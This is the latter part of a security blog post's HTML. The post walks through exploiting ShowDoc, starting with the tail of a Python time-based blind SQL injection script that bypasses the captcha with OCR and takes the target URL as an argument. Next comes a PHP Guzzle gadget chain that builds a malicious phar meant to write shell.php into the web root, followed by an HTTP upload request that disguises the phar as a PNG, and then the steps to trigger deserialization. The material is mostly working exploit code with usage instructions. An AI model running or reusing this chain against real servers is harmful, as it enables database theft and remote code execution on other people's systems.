      <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
      <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
      <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
      <span class="k">if</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">token</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
        <span class="k">break</span>
    <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">:</span>
      <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">create_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
  <span class="k">global</span> <span class="n">session</span>
  <span class="n">burp0_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/server/index.php?s=/api/common/createCaptcha</span><span class="sh">"</span>
  <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json, text/plain, */*</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span> <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">keep-alive</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/web/</span><span class="sh">"</span><span class="p">}</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">error_code</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
      <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">captcha_id</span><span class="sh">'</span><span class="p">]</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">pass</span>
  <span class="k">return</span> <span class="sh">""</span>


<span class="k">def</span> <span class="nf">captcha</span><span class="p">(</span><span class="n">img_bytes</span><span class="p">):</span>
  <span class="n">ocr</span> <span class="o">=</span> <span class="n">ddddocr</span><span class="p">.</span><span class="nc">DdddOcr</span><span class="p">(</span><span class="n">show_ad</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
  <span class="n">onnxruntime</span><span class="p">.</span><span class="nf">set_default_logger_severity</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">ocr</span><span class="p">.</span><span class="nf">classification</span><span class="p">(</span><span class="n">img_bytes</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">res</span>


<span class="k">def</span> <span class="nf">show_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
  <span class="k">global</span> <span class="n">session</span>
  <span class="n">captcha_id</span> <span class="o">=</span> <span class="nf">create_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
  <span class="n">burp0_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/server/index.php?s=/api/common/showCaptcha&amp;captcha_id=</span><span class="si">{</span><span class="n">captcha_id</span><span class="si">}</span><span class="sh">"</span>
  <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span>
                   <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">keep-alive</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Priority</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">u=1</span><span class="sh">"</span><span class="p">}</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
      <span class="k">return</span> <span class="nf">captcha</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">),</span> <span class="n">captcha_id</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
  <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
  <span class="kn">import</span> <span class="n">sys</span>

  <span class="nf">inject</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="c1"># pip install ddddocr
# Example: python exp.py target_url
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/showdoc/sql_inject.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/sql_inject.png" alt="img.png" loading="lazy"></a></p>

<h3 id="deserialization"><span class="me-2">Deserialization</span><a href="#deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>According to the patch information, it can be seen that new_is_writeable has been changed to private. Before the
modification, it could be accessed via <code class="language-plaintext highlighter-rouge">/server/index.php?s=/home/index/new_is_writeable&amp;file=file_path</code>, where the file
parameter is controllable. This parameter accepts a file path and uses <code class="language-plaintext highlighter-rouge">fopen</code> to open it.
<a href="/assets/img/showdoc/file.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/file.png" alt="img.png" loading="lazy"></a></p>

<p>So, we inject a phar file to trigger deserialization[5]. Phar files (PHP archives) contain metadata in serialized
format, so during parsing, this metadata will be deserialized. You can try to exploit deserialization vulnerabilities in
PHP code. The best thing about this feature is that deserialization will occur even with PHP functions that do not
execute PHP code, such as file_get_contents(),<code class="language-plaintext highlighter-rouge"> fopen()</code>, file(), file_exists(), md5_file(), filemtime(), or filesize().</p>

<p>Then, we need a POP chain, which we can refer to [6]. Showdoc uses <code class="language-plaintext highlighter-rouge">Guzzle</code>, and we can generate a phar file using
the following code.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kn">namespace</span> <span class="nn">GuzzleHttp\Cookie</span><span class="p">{</span>
    <span class="kd">class</span> <span class="nc">SetCookie</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$data</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'Expires'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
                <span class="s1">'Discard'</span> <span class="o">=&gt;</span> <span class="kc">null</span><span class="p">,</span>
                <span class="s1">'Value'</span> <span class="o">=&gt;</span> <span class="s1">'&lt;?php phpinfo();?&gt;'</span>
            <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">class</span> <span class="nc">CookieJar</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$strictMode</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
        <span class="k">private</span> <span class="nv">$cookies</span> <span class="o">=</span><span class="k">array</span><span class="p">();</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
            <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SetCookie</span><span class="p">();</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cookies</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span>
    <span class="kd">class</span> <span class="nc">FileCookieJar</span> <span class="kd">extends</span> <span class="nc">CookieJar</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">'/var/www/html/Sqlite/shell.php'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="p">{</span>

    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GuzzleHttp\Cookie\FileCookieJar</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s1">'bb.phar'</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="s1">'bb.phar'</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s2">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">addFromString</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span><span class="s2">"test"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">stopBuffering</span><span class="p">();</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<h3 id="file-upload"><span class="me-2">File Upload</span><a href="#file-upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Finally, we can register an account (registration is enabled by default) and log in to the backend to upload the
phar file, or use the aforementioned SQL injection vulnerability to obtain a user_token and upload the phar file via
the <code class="language-plaintext highlighter-rouge">/api/page/uploadImg</code> API.
<a href="/assets/img/showdoc/file_upload.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/file_upload.png" alt="img.png" loading="lazy"></a></p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="err">
</span><span class="nf">POST</span> <span class="nn">/server/index.php?s=/api/page/uploadImg&amp;user_token=9655f4241d296562d5d98dff872a6c2b6b81976620c90e0c2b0fdf9f8eeceb7d&amp;guid=1718689767541</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.128:4999</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------59380597416901700852304980266</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">748</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://192.168.32.128:4999</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://192.168.32.128:4999/web/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Priority</span><span class="p">:</span> <span class="s">u=4</span>

-----------------------------59380597416901700852304980266
Content-Disposition: form-data; name="editormd-image-file"; filename="test.png"
Content-Type: image/png

GIF89a&lt;?php __HALT_COMPILER(); ?&gt;


</pre></td></tr></tbody></table></code></div></div>

<p>After we successfully upload the file, we can obtain the link to the file. Then, we access the new_is_writeable
interface to trigger it.</p>

<p><a href="/assets/img/showdoc/upload.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/upload.png" alt="img.png" loading="lazy"></a>
<a href="/assets/img/showdoc/shell.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/shell.png" alt="img.png" loading="lazy"></a>
<a href="/assets/img/showdoc/info.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/info.png" alt="img.png" loading="lazy"></a></p>

<h2 id="reference"><span class="me-2">Reference</span><a href="#reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>[1] <a href="https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda">https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda</a></p>

<p>[2] <a href="https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30">https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30</a></p>

<p>[3] <a href="https://www.cnblogs.com/CoLo/p/16786626.html#%E8%B7%AF%E7%94%B1">https://www.cnblogs.com/CoLo/p/16786626.html#%E8%B7%AF%E7%94%B1</a></p>

<p>[4] <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p>

<p>[5] <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization">https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization</a></p>

<p>[6] <a href="https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/gadgets.php">https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/gadgets.php</a></p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/vulnerability/">vulnerability</a>,
          <a href="/categories/showdoc/">ShowDoc</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/showdoc/"
            class="post-tag no-text-decoration"
          >ShowDoc</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=ShowDoc%20Sql%20Injection%20and%20Remote%20Code%20Execution%20-%20imjdl%20blog&url=%2Fposts%2Fshowdoc-sql-injection-and-rce%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=ShowDoc%20Sql%20Injection%20and%20Remote%20Code%20Execution%20-%20imjdl%20blog&u=%2Fposts%2Fshowdoc-sql-injection-and-rce%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2Fshowdoc-sql-injection-and-rce%2F&text=ShowDoc%20Sql%20Injection%20and%20Remote%20Code%20Execution%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/zeroshell_linux_router_rce/">ZeroShell Linux Router 3.9.3 OS Command Injection vulnerability(CVE-2020-29390)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/showdoc-sql-injection-and-rce/">ShowDoc Sql Injection and Remote Code Execution</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/zentao-auth-bypass/">Zentao Authentication Bypass</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/system-maping/"></a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HTB-Catch/">HTB Catch Walkthrough</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/"></a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/vBulletin5-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1570505580"
  data-df="ll"
  
>
  Oct  8, 2019
</time>

              <h4 class="pt-0 my-2">vBulletin5 RCE</h4>
              <div class="text-muted">
                <p>
                  





                  Preface

RCEPoCphpVbulletin5.0.05.5.4

PoC

#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/cve-2019-19781-citrix-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1578627180"
  data-df="ll"
  
>
  Jan 10, 2020
</time>

              <h4 class="pt-0 my-2">CVE-2019-19781 Citrix Application DC & Citrix Gateway RCE</h4>
              <div class="text-muted">
                <p>
                  





                  Analysis

Two steps:

  Use path traversal request newbm.pl to write to xml file (1sh HTTP request).
  Template toolkit load and parse the xml file(2nd Request).


Path Traversal

In the published ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/DIR816L/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1582863180"
  data-df="ll"
  
>
  Feb 28, 2020
</time>

              <h4 class="pt-0 my-2">CVE-2020-15894 D-Link DIR-816L</h4>
              <div class="text-muted">
                <p>
                  





                  

 CVE-2020-15894 D-Link DIR-816L


  
    
      
      
    
  
  
    
      CVE
      CVE-2020-15894
    
    
      
      
    
    
      CNNVD
      CNNVD-202007-...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/zentao-auth-bypass/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Zentao Authentication Bypass</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imjdl/comments',
      'data-repo-id': 'MDEwOlJlcG9zaXRvcnkxNjc5MDc0Mjc=',
      'data-category': 'Announcements',
      'data-category-id': 'DIC_kwDOCgIQY84CbYtw',
      'data-mapping': 'url',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'top',
      'data-lang': 'en',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    
    <time>2024</time>
    <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/"></a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
